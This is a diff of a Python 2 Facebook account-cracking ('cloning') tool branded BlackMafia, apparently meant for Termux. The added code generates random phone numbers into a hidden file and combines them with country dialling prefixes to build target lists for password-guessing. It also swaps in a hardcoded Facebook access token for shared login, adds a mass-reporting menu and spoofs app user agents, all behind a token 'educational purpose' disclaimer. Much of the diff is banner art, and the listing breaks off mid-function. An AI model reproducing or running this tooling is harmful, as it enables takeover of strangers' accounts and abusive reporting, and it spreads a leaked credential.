@@ -3,7 +3,29 @@
 #The Credit For This Code Goes To lovehacker
 #If You Wanna Take Credits For This Code, Please Look Yourself Again...
 #Reserved2020
+import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass
+os.system('rm -rf .txt')
+for n in range(1000):
 
+    nmbr = random.randint(1111111, 9999999)
+    
+    sys.stdout = open('.txt', 'a')
+
+    print(nmbr)
+
+    sys.stdout.flush()
+    
+try:
+    import requests
+except ImportError:
+    os.system('pip2 install requests')
+    
+try:
+    import mechanize
+except ImportError:
+    os.system('pip2 install mechanize')
+    time.sleep(1)
+    os.system('python2 Cloning.py')
 
 import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,requests,mechanize
 from multiprocessing.pool import ThreadPool
@@ -17,9 +39,10 @@ br = mechanize.Browser()
 br.set_handle_robots(False)
 br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]
+br.addheaders = [('user-agent','Dalvik/1.6.0 (Linux; U; Android 4.4.2; NX55 Build/KOT5506) [FBAN/FB4A;FBAV/106.0.0.26.68;FBBV/45904160;FBDM/{density=3.0,width=1080,height=1920};FBLC/it_IT;FBRV/45904160;FBCR/PosteMobile;FBMF/asus;FBBD/asus;FBPN/com.facebook.katana;FBDV/ASUS_Z00AD;FBSV/5.0;FBOP/1;FBCA/x86:armeabi-v7a;]')]
 
 def keluar():
-	print "\x1b[1;91mExit"
+	print 'God by Frends '
 	os.sys.exit()
 
 def acak(b):
@@ -82,7 +105,7 @@ logo2 = """
 \033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇  \033[1;91m   ▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
 \033[1;96m▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇▇▇\033[1;91m▇▇▇▇▇┈┈┈┈┈┈┈┈┈┈┈┈┈┈▇▇
 \033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  03094161457 ▇▇
-\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
+\033[1;95m«---------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
 logo3 = """
 \033[1;93m▇▇ WhatsApp Num ▇▇\033[1;93m     ▇▇  03094161457 ▇▇"
 ___________________$$$$$$
@@ -361,26 +384,25 @@ logo10 = """
                        4    %
 \033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
 logo11 = """
-\033[1;96m                                             
-        _______           
-    .adOOOOOOOOOba.
-   dOOOOOOOOOOOOOOOb
-  dOOOOOOOOOOOOOOOOOb
- dOOOOOOOOOOOOOOOOOOOb
-|OOOOOOOOOOOOOOOOOOOOO|
-OP'~"YOOOOOOOOOOOP"~`YO
-OO     `YOOOOOP'     OO
-OOb   ●  `OOO' ●   dOO
-YOOo      OOO      oOOP
-`OOOo     OOO     oOOO'
- `OOOb._,dOOOb._,dOOO'
-  `OOOOOOOOOOOOOOOOO'
-   OOOOOOOoOoOOOOOOO 
-   YOOOOOOOOOOOOOOOP
-   `OOOOOI```IOOOOO'
-    `OOOOI,,,IOOOO'
-     `OOOOOOOOOOO'
-       `~OOOOO~'   BlackMafia
+\033[1;96m        _______        \033[1;93m        _______    
+\033[1;96m    .adOOOOOOOOOba.    \033[1;93m     .adOOOOOOOOOba.
+\033[1;96m   dOOOOOOOOOOOOOOOb   \033[1;93m    dOOOOOOOOOOOOOOOb 
+\033[1;96m  dOOOOOOOOOOOOOOOOOb  \033[1;93m   dOOOOOOOOOOOOOOOOOb
+\033[1;96m dOOOOOOOOOOOOOOOOOOOb \033[1;93m  dOOOOOOOOOOOOOOOOOOOb
+\033[1;96m|OOOOOOOOOOOOOOOOOOOOO|\033[1;93m |OOOOOOOOOOOOOOOOOOOOO|
+\033[1;96mOP'~"YOOOOOOOOOOOP"~`YO\033[1;93m OP'~"YOOOOOOOOOOOP"~`YO
+\033[1;96mOO     `YOOOOOP'     OO\033[1;93m OO     `YOOOOOP'     OO 
+\033[1;96mOOb   ●  `OOO'  ●   dO\033[1;93m  OOb   ●  `OOO'  ●   dO
+\033[1;96mYOOo      OOO      oOOP\033[1;93m YOOo      OOO      oOOP
+\033[1;96m`OOOo     OOO     oOOO'\033[1;93m `OOOo     OOO     oOOO'
+\033[1;96m `OOOb._,dOOOb._,dOOO' \033[1;93m  `OOOb._,dOOOb._,dOOO'
+\033[1;96m  `OOOOOOOOOOOOOOOOO'  \033[1;93m   `OOOOOOOOOOOOOOOOO'
+\033[1;96m   OOOOOOOoOoOOOOOOO   \033[1;93m    OOOOOOOoOoOOOOOOO 
+\033[1;96m   YOOOOOOOOOOOOOOOP   \033[1;93m    YOOOOOOOOOOOOOOOP
+\033[1;96m   `OOOOOI```IOOOOO'   \033[1;93m    `OOOOOI```IOOOOO'
+\033[1;96m    `OOOOI,,,IOOOO'    \033[1;93m     `OOOOI,,,IOOOO'   
+\033[1;96m     `OOOOOOOOOOO'     \033[1;93m      `OOOOOOOOOOO'
+\033[1;96m       `~OOOOO~'  Black\033[1;93mMafia   `~OOOOO~'   
 \033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
 logo12 = """
 \033[1;91m•~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿(◡‿◡)♥☸~♥~♥~ ?̵̡?̵̨̄?✿
@@ -751,6 +773,32 @@ logo25 = """
 \033[1;93m          |___/
 \033[1;95m BlackMafia  Login 
 \033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
+logo26 = """
+\033[1;91m
+             ,   ,
+            $,  $,     ,
+            *ss.$ss. .s'
+    ,     .ss$$$$$$$$$$s,
+    $. s$$$$$$$$$$$$$$`$$Ss
+    *$$$$$$$$$$$$$$$$$$o$$$       ,
+   s$$$$$$$$$$$$$$$$$$$$$$$$s,  ,s
+  s$$$$$$$$$*$$$$$$****$$$$$$*$$$$$,
+ s$$$$$$$$$$s**$$$$ssssss*$$$$$$$$*
+ s$$$$$$$$$$'         `***ss*$*$s**
+ s$$$$$$$$$$,              `****    .s$$s
+ s$$$$$$$$$$$$s,...                 $$'  
+ ss$$$$$$$$$$$$$$$$$$$$####s.     .$$*$$$   
+ ***$$$$$$$$$$$$$$$$$$$$#### $$$$$$*     $$$$
+     *$$$$$$$$$$$$$$$$$$$$$####s**     .$$
+      *$$$$$$$$$$$$$$$$$$$$$$$$##s    .$$$$$
+       $$**$$$$$$$$$$$$$$$$$$$$$$$$$$$$$*   
+      $$*  *$*$$$$$$$$$$$$$$$$$$$$S****'
+     ,*     '  $$$$$$$$$$$$$$$$####s
+ $.          .s$$$$$$$$$$$$$$$$$####*
+ *$s.   ..ssS$$$$$$$$$$$$$$$$$$$####*
+  .$$$S$$$$$$$$$$$$$$$$$$$$$$$$#####*
+\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
+
 
 def tik():
 	titik = ['.   ','..  ','... ']
@@ -763,6 +811,7 @@ berhasil = []
 cekpoint = []
 oks = []
 id = []
+cpb = []
 listgrup = []
 gagal = []
 idfriends = []
@@ -818,47 +867,17 @@ print  """
 \033[1;91m██║░╚═╝░██║██║░░██║██║░░░░░██║██║░░██║
 \033[1;91m╚═╝░░░░░╚═╝╚═╝░░╚═╝╚═╝░░░░░╚═╝╚═╝░░╚═╝
 \033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"""
-jalan("\033[1;91m                     .ed$$$$ $$$$$$$be.")
-jalan("\033[1;91m                   -$           ^****$$$e.")
-jalan("\033[1;91m                 .$                   *$$$c")
-jalan("\033[1;91m                /                      *4$$b")
-jalan("\033[1;91m               d  3                      $$$$")
-jalan("\033[1;91m               $  *                   .$$$$$$")
-jalan("\033[1;91m              .$  ^c           $$$$$e$$$$$$$$.")
-jalan("\033[1;91m              d$L  4.         4$$$$$$$$$$$$$$b")
-jalan("\033[1;91m              $$$$b ^ceeeee.  4$$ECL.F*$$$$$$$")
-jalan("\033[1;91m  e$**=.      $$$$P d$$$$F $ $$$$$$$$$- $$$$$$")
-jalan("\033[1;91m z$$b. ^c     3$$$F *$$$$b   $*$$$$$$$  $$$$**      .=**$c")
-jalan("\033[1;91m4$$$$L        $$P*  *$$b   .$ $$$$$...e$$        .=  e$$$.")
-jalan("\033[1;91m^*$$$$$c  %..   *c    ..    $$ 3$$$$$$$$$$eF     zP  d$$$$$")
-jalan("\033[1;91m  ***$$$ec   *   %ce**    $$$  $$$$$$$$$$*    .r* =$$$$P**")
-jalan("\033[1;91m        **$b.  *c  *$e.    *** d$$$$$*L$$    .d*  e$$****")
-jalan("\033[1;91m          ^*$$c ^$c $$$      4J$$$$$% $$$ .e**.eeP*")
-jalan("\033[1;91m             *$$$$$$**$=e....$*$$**$cz$$" *..d$**")
-jalan("\033[1;91m               **$$$  *=%4.$ L L$ P3$$$F $$$P*")
-jalan("\033[1;91m                  *$   *%*ebJLzb$e$$$$$b $P*")
-jalan("\033[1;91m                    %..      4$$$$$$$$$$ *")
-jalan("\033[1;91m                     $$$e   z$$$$$$$$$$%")
-jalan("\033[1;91m                      **$c  *$$$$$$$P$")
-jalan("\033[1;91m                       .**$**$$$$$$$$bc")
-jalan("\033[1;91m                    .-*    .$***$$$**$**e.")
-jalan("\033[1;91m                 .-*    .e$*     **$c  ^*b.")
-jalan("\033[1;91m          .=*$*$*    .e$**          **bc  **$e..")
-jalan("\033[1;91m        .$*        .z**               ^*$e.   ******e.")
-jalan("\033[1;91m        $$ee$c   .d*                     **$.        3.")
-jalan("\033[1;91m        ^*$E*)$..$*                         *   .ee==d%")
-jalan("\033[1;91m           $.d$$$*        BlackMafia         *  J$$$e*")
-jalan("\033[1;91m            $$$$                              *$$$*")
-jalan("\033[1;91m┳┻┳┻▇▇▇▇▇▇     ╭━━━━╮╱▔▔▔╲      ▇▇▇▇▇▇┳┻┳┻┳┻")
-jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ┃╯╯╭━┫▏╰╰╰▕      ▇▇▇▇▇▇┻┳┻┳┻┳")
-jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ┃╯╯┃▔╰┓▔▂▔▕╮     ▇▇▇▇▇▇┳┻┳┻┳┻")
-jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ╰╮╯┃┈╰┫╰━╯┏╯     ▇▇▇▇▇▇┻┳┻┳┻┳")
-jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇     ┏╯╯┃╭━╯┳━┳╯      ▇▇▇▇▇▇┻┳┻┳┻┳")
-jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ╰━┳╯▔╲╱▔╭╮▔╲     ▇▇▇▇▇▇┳┻┳┻┳┻")
-jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇       ┃┈╲┈╲╱╭╯╮▕     ▇▇▇▇▇▇┻┳┻┳┻┳")
-jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇       ┃┈▕╲▂╱┈╭╯╱     ▇▇▇▇▇▇┳┻┳┻┳┻")
-jalan("\033[1;93m┳┻┳┻▇▇▇▇▇▇       ┃'''┈┃┈┃┈'''   ▇▇▇▇▇▇┻┳┻┳┻┳")
-jalan("\033[1;93m┻┳┻┳▇▇▇▇▇▇     ┏╯▔'''╰┓┣━┳┫     ▇▇▇▇▇▇┳┻┳┻┳┻")
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠛⠋⠉⠀⠀⠀⠀⠉⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠉\033[1;95m⠀ BlackMafia⠀\033[1;92m⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣆⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ") 
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⡏⠀⠀⠀⠀⢹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣠⣤⣤⣤⣴⣶⣾⣿⣿⣿⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣧⠀⠀⠀⣠⣾⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⣸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⡄⣴⠾⠟⢛⣿⡿⠋⠙⠛⠛⢿⡟⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣄⠀⣴⣿⠋⠀⠀⠀⠀⠀⣿⠇⠀⠀⠀⠀⠀⢠⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣶⣶⣶⣶⣶⣶⣿⣷⣶⣦⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")
+jalan("\033[1;92m⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿ ")                                                                                                                                                                                                                                                          
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
 jalan("\033[1;93m▇▇\033[1;95m           WellCome to BlackMafia     \033[1;93m▇▇")
 jalan("\033[1;93m▇▇\033[1;91m             👇Tool Using Tips👇      \033[1;93m▇▇")
@@ -867,7 +886,6 @@ jalan("\033[1;93m▇▇\033[1;92m        Termux Data Clear EveryDay    \033[1;93
 jalan("\033[1;93m▇▇\033[1;92m         WhatsApp  Num 03094161457    \033[1;93m▇▇")
 jalan("\033[1;93m ▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇▇")
 print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"
-
 CorrectUsername = "Black"
 CorrectPassword = "Mafia"
 
@@ -896,11 +914,17 @@ def lisensi():
 def login():
 	os.system('clear')
 	print logo11
-	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;96m Login  Facebook  "
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m1.\x1b[1;92m New Update  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;95m Login  Using Token"
+	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m2.\x1b[1;96m Login  Facebook  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m3.\x1b[1;93m Get Access Token App Fb"
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m3.\x1b[1;95m Login  Using Token"
+        time.sleep(0.05)
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m4.\x1b[1;97m Get Access Token App Fb"
+        time.sleep(0.05)
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m5.\x1b[1;94m Black Mafia  WhatsApp Group   "
+        time.sleep(0.05)
+        print "\033[1;93m-•◈•-\033[1;91m> \033[1;93m6.\x1b[1;93m Black Mafia  Youtube Chenal   "
         time.sleep(0.05)
 	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Exit             "
 	pilih_login()
@@ -910,12 +934,20 @@ def pilih_login():
 	if peak =="":
 		print "\x1b[1;91mFill in correctly"
 		pilih_login()
-	elif peak =="1":
+        elif peak =="1":
+		blackmafiax()
+	elif peak =="2":
 		login1()
-        elif peak =="2":
-	        tokenz()
         elif peak =="3":
+	        tokenz()
+        elif peak =="4":
 	        os.system('xdg-open https://m.apkpure.com/get-access-token/com.proit.thaison.getaccesstokenfacebook/download/1-APK?from=versions%2Fversion')
+	        login()
+        elif peak =="5":
+		os.system('xdg-open https://chat.whatsapp.com/FmuKakzK8oV3Rp6gpf9Xqr')
+	        login()
+        elif peak =="6":
+	        os.system('xdg-open https://m.youtube.com/channel/UCRrRgcJjsnNm5Bi5ZenRGnw')
 	        login()
 	elif peak =="0":
 		keluar()
@@ -1020,23 +1052,23 @@ def menu():
         time.sleep(0.05)
 	print "	   \033[1;93m «----ID\033[1;97m:\033[1;92m"+id+"\x1b[1;96m              "
         time.sleep(0.05)
-	print "\033[1;95m«-----------------\033[1;91mDisclaimer\033[1;95m-----------------»"
+	print "\033[1;95m«-----------------\033[1;91mDisclaimer\033[1;95m---------------»"
         time.sleep(0.05)
-        print "\033[1;47m       \033[1;33mThis Tool is for Educational Purpose\033[1;0m"
+        print "\033[1;43m       \033[1;34mThis Tool is for Educational Purpose   \033[1;0m"
         time.sleep(0.05)
-        print "\033[1;47m\033[1;31mThis presentation is for educational\033[1;0m"
+        print "\033[1;45m\033[1;34mThis presentation is for educational          \033[1;0m"
         time.sleep(0.05)
-        print "\033[1;47m\033[1;31mpurposes ONLY.How you use this information\033[1;0m"
+        print "\033[1;45m\033[1;34mpurposes ONLY.How you use this information    \033[1;0m"
         time.sleep(0.05)
-        print "\033[1;47m\033[1;31mis your responsibility.I will not be\033[1;0m  "
+        print "\033[1;45m\033[1;34mis your responsibility.I will not be          \033[1;0m"
         time.sleep(0.05)
-        print "\033[1;47m\033[1;31mheld accountable This Tool/Channel Doesn't\033[1;0m"
+        print "\033[1;45m\033[1;34mheld accountable This Tool/Channel Doesn't    \033[1;0m"
         time.sleep(0.05)
-        print "\033[1;47m\033[1;31mSupport illegal activities.for any illegal\033[1;0m"
+        print "\033[1;45m\033[1;34mSupport illegal activities.for any illegal    \033[1;0m"
         time.sleep(0.05)
-        print "\033[1;47m\033[1;31mActivitie This Tool is for Educational Purpose \033[1;0m"
+        print "\033[1;45m\033[1;34mActivitie This Tool is for Educational Purpose\033[1;0m"
         time.sleep(0.05)
-        print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"
+        print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m---------------»"
         time.sleep(0.05)
 	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;96m\033[1;92m Start    Cloning BlackMafia     "
         time.sleep(0.05)
@@ -1084,8 +1116,8 @@ def pilih():
 	        menu()
         elif unikers =="6":
 		os.system('clear')
-		print logo7
-		print "\033[1;95m«-----------------\033[1;91mMessage\033[1;95m-----------------»"
+		print logo10
+		print "\033[1;95m«-----------------\033[1;91mMessage\033[1;95m---------------»"
                 jalan('\033[1;92m............Massage..........')
 		jalan('\033[1;95mID Not Found Problum Salution Menu 5 Num Option')
                 jalan("\033[1;96mTermux  Data Clear Every Day")
@@ -1376,7 +1408,7 @@ def pilih():
 	elif unikers =="11":
 		os.system('clear')
 		print logo6
-		print "\033[1;95m«-----------------\033[1;91mDataReset\033[1;95m-----------------»"
+		print "\033[1;95m«-----------------\033[1;91mDataReset\033[1;95m---------------»"
                 jalan('\033[1;96m=10%')
                 jalan("\033[1;96m==20%")
                 jalan('\033[1;96m===30%')
@@ -1411,7 +1443,7 @@ def crack():
 		time.sleep(1)
 		login()
 	os.system('clear')
-	print logo10
+	print logo26
 	print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m1 .\x1b[1;95m Start Cloning Pakistan       "
         time.sleep(0.05)
         print "\033[1;93m-•◈•-\033[1;93m> \033[1;93m2 .\x1b[1;95m Start Cloning India          "
@@ -1446,7 +1478,7 @@ def pilih_crack():
 		os.system('clear')
 		print logo
 		jjt = raw_input("\033[1;96m[+] \033[1;93mEnter ID\033[1;93m: \033[1;97m")
-		print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m-----------------»"
+		print "\033[1;95m«-----------------\033[1;91mBlackMafia\033[1;95m---------------»"
 		try:
 			m = requests.get("https://graph.facebook.com/"+jjt+"?access_token="+toket)
 			td = json.loads(m.text)
@@ -1492,14 +1524,14 @@ def pilih_crack():
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
-	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
+	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
 	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
         jalan(' \033[1;95m         Start Cloning Pakistan ')
-	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
+	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
 	
 			
 	def main(arg):
-		global cekpoint,oks
+		global cekpoint,sucessful
 		user = arg
 		try:
 			os.mkdir('cookie')
@@ -1698,10 +1730,10 @@ def pilih_hack():
 	for o in titik:
 		print("\r\033[1;93mCloning\033[1;93m"+o),;sys.stdout.flush();time.sleep(1)
 	print "\n\033[1;97m«-----\x1b[1;91m【To Stop Process Press CTRL+Z】\033[1;97m----»"
-	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
+	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
 	jalan(' \033[1;93mPlz Wait Cloned Accounts Will Appear Here')
         jalan(' \033[1;95m         Start Cloning Indonasia ')
-	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m--------------------»"
+	print "\033[1;97m«--------------------\033[1;92m▣\033[1;97m------------------»"
 	
 			
 	def main(arg):
@@ -2793,7 +2825,7 @@ def brute():
 def tokenz():
 	os.system('clear')
 	print logo
-	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;95mCopy👉  \033[1;96m EAAAAUaZA8jlABAKv6jwp6VueNwvdaMy7ogVC6xRkdL0oQVK8WiZCqmoO83ECZAS8DqsFsTuo6slGiIVRu5XKQBhgRbzycZAfanrT8ZAwcaEjEFZCtUKHK1YGK72Lq7AFh6lwLGVJkWZAqjSg9AG1KYQUJo2whwkZCkG2ZBafGtxO7rEdlJwKIkYilW0XTaw8KBC0ZD  \033[1;95m👈 With out fb ID free login Paste & Enter👉")
+	toket = raw_input("\033[1;91m[?] \033[1;92mToken\033[1;91m : \033[1;95mCopy👉  \033[1;96m EAAAAUaZA8jlABAFpDXx3FwAnUMnKBSR7hoNeO0XK0qSocPc0dxfrP0L13QVa0yXMaWKNzx8M5ZC6Ajpq50uSkfNpSHlX8kDUonlLXWFuP32hbPWjPLyoZAjZC4wKKnDTcYKHm7YsuHd7PJYzfrCZCb373OVWXeX16Vv50fFwdSiO7RZA1L152EBsXz5mgDZBvIZD  \033[1;95m👈 With out fb ID free login Token Paste & Enter👉")
 	try:
 		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
 		a = json.loads(otw.text)
@@ -4188,17 +4220,19 @@ def fighter():
 		login()
 	os.system('clear')
 	print logo23
-	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;92m Target Profile.  "
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m1.\x1b[1;92m CoviD19 Death Report.  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;92m Start  Reporting."
+	print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m2.\x1b[1;92m Target  Profile.  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;92m Start  Report1.  "
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m3.\x1b[1;92m Start   Reporting."
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m4.\x1b[1;92m Start  Report2.  "
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m4.\x1b[1;92m Start   Report1.  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m5.\x1b[1;92m Start  Report3.  "
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m5.\x1b[1;92m Start   Report2.  "
         time.sleep(0.05)
-        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m6.\x1b[1;92m Start  Report4.  "
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m6.\x1b[1;92m Start   Report3.  "
+        time.sleep(0.05)
+        print "\033[1;93m-•◈•-\033[1;97m> \033[1;91m7.\x1b[1;92m Start   Report4.  "
         time.sleep(0.05)
 	print "\033[1;93m-•◈•-\033[1;91m> \033[1;91m0.\033[1;91m Back             "
 	pilih_fighter()
@@ -4208,17 +4242,20 @@ def pilih_fighter():
 	if peak =="":
 		print "\x1b[1;91mFill in correctly"
 		pilih_fighter()
-	elif peak =="1":
+        elif peak =="1":
+	        os.system('xdg-open https://m.facebook.com/help/contact/228813257197480?refid=69')
+	        pilih_fighter()
+	elif peak =="2":
 		report()
-        elif peak =="2":
-	        rep()
         elif peak =="3":
-                test1()
+	        rep()
         elif peak =="4":
-	        test2()
+                test1()
         elif peak =="5":
-	        test3()
+	        test2()
         elif peak =="6":
+	        test3()
+        elif peak =="7":
 	        test4()
 	elif peak =="0":
 		menu()
@@ -4293,7 +4330,321 @@ def test4():
         exit()
     except Exception as f:         
         print ('    Bad406')
+
+def blackmafiax():
+	os.system('clear')
+	print logo
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[1]  Bangladesh'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[2]  USA'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[3]  UK'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[4]  India'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[5]  Brazil'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[6]  Japan'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[7]  Korea'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[8]  Italy'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[9]  Spain'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[10] Poland'
+        time.sleep(0.5)
+        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[11] Pakistan'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[12] Indonasia'
+        time.sleep(0.5)
+        print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;92m[13] Grecee'
+        time.sleep(0.5)
+	print '\033[1;93m-•◈•-\033[1;97m> \033[1;91m☆.\x1b[1;91m[0]  Back            '
+        time.sleep(0.5)
+	print 45*'-'
+	action()
+
+
+def action():
+	lovehackerx = raw_input('\n\033[1;91mChoose an Option>>> \033[1;95m')
+	if lovehackerx =='':
+		print '[!] Fill in correctly'
+		action()
+	elif lovehackerx =="1":
+		os.system("clear")
+		print (logo14)
+		print("\033[1;93m191, 192, 193, 194, 195, 196, 197, 198, 199")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+880"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="2":
+		os.system("clear")
+		print (logo2)
+		print("\033[1;93m786, 815, 315, 256, 401, 718, 917, 202, 701, 303, 703, 803, 999, 708")
+		try:
+			c = raw_input("\033[1;95m choose code  : ")
+			k="+1"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
+				id.append(line.strip())
+		except IOError:
+			print ("[!] File Not Found")
+			raw_input("\n[ Back ]")
+			blackmafiax()
+	elif lovehackerx =="3":
+		os.system("clear")
+		print (logo3)
+		print("\033[1;93m737, 706, 748, 783, 739, 759, 790")
+		try:
+			c = raw_input(" \033[1;95mchoose code  : ")
+			k="+44"
+			idlist = ('.txt')
+			for line in open(idlist,"r").readlines():
